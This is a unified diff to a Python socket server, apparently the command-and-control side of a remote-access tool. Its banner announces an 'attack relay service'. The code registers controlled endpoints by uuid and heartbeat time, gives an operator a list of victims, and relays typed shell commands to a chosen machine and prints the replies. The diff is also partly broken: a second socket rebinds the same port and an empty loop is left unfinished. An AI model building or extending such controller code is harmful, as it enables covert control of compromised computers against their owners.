@@ -13,8 +13,21 @@ sock.bind((host, port))
 sock.listen(5)
 #对话循环
 
+def get_time(userlist):
+	zlis = []
+	for key, value in userlist.items():   
+		a = []
+		a.append(key)
+		a.append(value)
+		a='yicengfenli'.join(a)
+		zlis.append(a)
+
+	zlis='ercengfenli'.join(zlis)
+	return zlis
+
+
 print("攻击转发服务启动！")
-all_time = ""
+user_list = {}
 
 while True:
 
@@ -25,18 +38,45 @@ while True:
 	#接收模式识别
 	mod = cli.recv(2048).decode()
 
-	'''
-	#模式为验证更新
+
 	if mod == "heart":
 		cli.sendall("my".encode())
 		print("被控端接入！")
-		print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
-
+		timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+		print(timenow)
 		uuid = cli.recv(2048).decode()
+
+		user_list[uuid] = timenow
+
 		cli.sendall("stop".encode())
 
+	if mod == "ctrl":
+		#发送用户时间表
+		data = get_time(user_list)
+		cli.sendall(data.encode())
+		user = cli.recv(2048).decode()
 
-	'''	
+		sock2 = socket.socket()
+		#绑定主机和端口
+		sock2.bind((host, port))
+		#开始监听
+		sock2.listen(5)
+		#对话循环
+		while True:
+			cli, addr = sock2.accept()
+			mod = cli.recv(2048).decode()
+
+
+
+
+
+
+
+
+
+
+
+
 	cli.sendall("my".encode())
 	print("被控端接入！")
 	print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
@@ -47,4 +87,6 @@ while True:
 	while True:
 		cmd = input(">>>")
 		cli.sendall(cmd.encode())
-		print(cli.recv(2048).decode())
+		z = cli.recv(10240).decode()
+		z = z.split("thisisafengefu")
+		print(z)
